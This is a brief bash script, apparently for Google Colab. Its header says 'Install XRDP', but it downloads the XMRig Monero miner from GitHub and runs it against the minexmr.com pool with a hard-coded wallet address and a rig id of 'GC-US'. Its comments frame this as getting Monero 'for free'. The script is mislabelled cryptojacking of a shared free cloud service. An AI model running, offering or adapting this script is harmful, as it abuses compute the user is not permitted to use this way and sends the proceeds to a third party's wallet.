#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-bionic-x64.tar.gz
tar xvzf xmrig-6.16.4-bionic-x64.tar.gz
cd xmrig-6.16.4
./xmrig -o us-west.minexmr.com:443 -u 43FS7CfZ8Mi6U6KFVrKSQ9Ln3XrJP6eNHTQrqXsuahaUCTaVKFazmCMKJsbzHQxjaofSpBAgLY2U99qCEMCVhEpGHw2CF2Y -k --tls --rig-id GC-US
